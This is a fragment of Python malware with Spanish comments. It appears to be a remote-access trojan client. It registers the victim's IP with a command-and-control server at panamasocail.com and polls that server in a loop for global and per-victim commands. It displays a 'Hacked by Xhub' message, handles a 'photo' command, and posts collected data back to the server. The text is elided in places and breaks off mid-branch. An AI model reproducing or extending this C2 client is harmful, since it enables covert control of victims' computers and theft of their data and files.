...
ip = requests.post("http://panamasocail.com/exe/back/ip.php", headers=headers, data=select).text
#print("Iniciando")
#print("IP: " + ip)
time.sleep(2)
while True:
    dat = "cls"
    time.sleep(1)
    enter = requests.post("http://panamasocail.com/exe/back/comand.txt", headers=headers)
    #esta parte es la parte individual, esto genera que solo un usuario lo haga
    if enter.text == "":
        enter = requests.post(f"http://panamasocail.com/exe/back/{ip}.txt", headers=headers)
        rec = enter.text
        print(rec)
        if rec == "hacked":
            MessageBox.showinfo("Hacked by Xhub", "Has sido Hackeado\nNo descargar cualquier cosa!")
            e = requests.post("http://panamasocail.com/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
        elif rec == "":
            ...
            url = "http://panamasocail.com/exe/photo/photo.php"
...
#url que se usara para recivir los archivos
            ...
            url = "https://panamasocail.com/exe/dbs/cxxxxxxxxxxx.php"
            #headers 
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
            ...
            time.sleep(1)
            envio = str(env)
            envi = requests.post("http://panamasocail.com/exe/back/comand.php", data={"data": envio}, headers=headers)
            time.sleep(5)
            print(envi.text)
            e = requests.post(f"http://panamasocail.com/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
...
#Aqui termina la parte de usuario individual, y comienza la parte de todos los usuarios
        ...
        if rec == "hacked":
            MessageBox.showinfo("Hacked by Xhub", "Has sido Hackeado\nNo descargar cualquier cosa!")
            e = requests.post("http://panamasocail.com/exe/back/comand.php", data={"data": "listo"}, headers=headers)
        elif rec == "":
            print("No hay comandos")
            time.sleep(60)
        elif rec == "photo":
